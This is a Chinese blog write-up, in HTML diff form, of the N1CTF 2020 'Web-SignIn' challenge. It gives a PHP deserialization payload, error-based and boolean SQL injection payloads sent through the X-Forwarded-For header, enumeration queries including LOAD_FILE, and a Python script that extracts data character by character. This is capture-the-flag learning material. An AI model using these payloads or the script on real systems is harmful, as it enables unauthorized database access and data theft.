+        2020年10月17日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2020年10月N1CTF部分web题解</h1>
+            
+            <div class="markdown-body">
+              <p>题解地址：<a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p>
+<hr>
+<a id="more"></a>
+
+<h1 id="Web-SignIn（SQL盲注-报错注入-布尔注入）"><a href="#Web-SignIn（SQL盲注-报错注入-布尔注入）" class="headerlink" title="Web-SignIn（SQL盲注+报错注入+布尔注入）"></a>Web-SignIn（SQL盲注+报错注入+布尔注入）</h1><p>思路历程大致是这样的，比赛后没环境（</p>
+<ul>
+<li>理解反序列化执行流程。</li>
+<li>反序列化执行 toString 函数。（绕过 wakeup，利用 destuct 的 echo 函数）<ul>
+<li>安装 php5.5</li>
+<li>本地绕过</li>
+<li>云端绕过（没有回显）</li>
+</ul>
+</li>
+<li>利用 stristr 函数调用 toString 函数。<ul>
+<li>时间盲注（时间函数被 WAF 了）</li>
+<li>SQL注入之基于运行错误的Boolean注入<ul>
+<li>语法错误和正常执行 noip</li>
+<li>特殊错误 welcome（含数据库名或后面的函数报错）<ul>
+<li>‘+(select updatexml(1,concat(0x7e,(select database()),0x7e),1))+’</li>
+<li>‘+(select _(1))+’<br>MySQL</li>
+<li>exp(~(select * from (select n1ctf_websign())a))</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>构造 XFF 进行 SQL 注入。</li>
+<li>编写 exp 进行报错<br>payload：’+(select (database()&gt;1) and exp(~(select * from (select user())n1ctf_websign)))+’<br>利用 and 的特性进行判断。</li>
+<li>最后从 n1key 中读出 flag。<ul>
+<li>注意字段为 key 时需要使用别名。（与MySQL字段冲突）</li>
+</ul>
+</li>
+</ul>
+<p>反序列化：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;flag&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;check&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:&quot;thrmen&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png" srcset="/img/loading.gif"></p>
+<p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png" srcset="/img/loading.gif"></p>
+<p>用到的SQL语句:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br># 查询数据库名字<br># <span class="hljs-keyword">database</span>()<br><br># 查询数据库信息<br># <span class="hljs-keyword">SELECT</span> concat(version(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br># 查询文件读取权限<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span><br><br># 查询当前用户<br># <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br># 查询数据库版本<br># version()<br><br># 查询表名的长度<br>#  (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br># 查询表名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br># 判断字段名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>。<br><br># 查询 ip 表。（边插入边查询，需要使用别名）<br># <span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）<br># <span class="hljs-keyword">select</span> GROUP_CONCAT(id) <span class="hljs-keyword">FROM</span> n1key<br># <span class="hljs-keyword">select</span> group_concat(bb.key) <span class="hljs-keyword">from</span> n1key bb<br># <span class="hljs-keyword">select</span> group_concat(key) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br># <span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 不使用字段名度值<br># <span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br># 判断是否有数据<br># <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> key <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br><br># 查询文件<br># <span class="hljs-keyword">SELECT</span> LOAD_FILE(<span class="hljs-string">&#x27;/flag&#x27;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>爆破使用的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-comment"># 生成库名表名字符所在的字符列表字典</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ascii_str</span>():</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可显示字符</span><br>        str_list.append(chr(i))<br>    <span class="hljs-comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span><br>    <span class="hljs-comment"># # 返回字符列表</span><br>    <span class="hljs-keyword">return</span> str_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">sql</span>):</span><br>    payload = <span class="hljs-string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="hljs-string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span><br>    print(payload)<br>    resp = session.get(<br>        url=url,<br>        headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>: payload&#125;<br>    )<br>    soup = BeautifulSoup(markup=resp.text, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取判读 True 和 False 的依据</span><br>    result = soup.find_all(name=<span class="hljs-string">&#x27;code&#x27;</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(result)</span><br><br>    <span class="hljs-comment"># 执行成功返回 True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1ctf2020&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># 用于测试函数是否正常执行（使用 while 不方便）</span><br><span class="hljs-comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span><br><span class="hljs-comment"># result = query(param)</span><br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-comment"># 不同的字典</span><br>CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHAR_DICTIONARY2 = ascii_str()<br><br><span class="hljs-comment"># find 用于存储已找到的字符</span><br>find = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 使用 ascii 作用判断依据更好。</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    f = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>, <span class="hljs-number">127</span>):<br>        pos = len(find) + <span class="hljs-number">1</span><br>        s = <span class="hljs-string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span><br>        <span class="hljs-comment"># 使用 ascii 码进行判断（更优）</span><br>        param = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;s&#125;</span>), <span class="hljs-subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="hljs-subst">&#123;c&#125;</span>&#x27;&quot;</span><br>        <span class="hljs-comment"># 使用 char 进行字符判断。</span><br>        <span class="hljs-comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span><br>        result = query(param)<br>        <span class="hljs-keyword">if</span> result:<br>            f = <span class="hljs-literal">True</span><br>            find += chr(c)<br>            print(find)<br>            print(<span class="hljs-string">&#x27;-------------------------&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f:<br>        <span class="hljs-keyword">break</span><br>print(find)<br><br></code></pre></td></tr></table></figure>
+
+<p>参考教程：</p>
+<ol>
+<li>你真的了解 IP 吗，PHP 如何严格获取真实用户 IP？：<a target="_blank" rel="noopener" href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip">https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip</a></li>
+<li>Bugku INSERT INTO注入(时间盲注）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37873738/article/details/85633897">https://blog.csdn.net/qq_37873738/article/details/85633897</a></li>
+</ol>
+<hr>
+<p>后面的题目以后有时间补补（占坑</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2020年10月ByteCTF部分web题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020%E5%B9%B410%E6%9C%8814%E6%97%A5-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">
+                        <span class="hidden-mobile">2020年10月西湖论剑CTF部分web题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-WTRCMZDFLE', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WTRCMZDFLE"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-WTRCMZDFLE');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
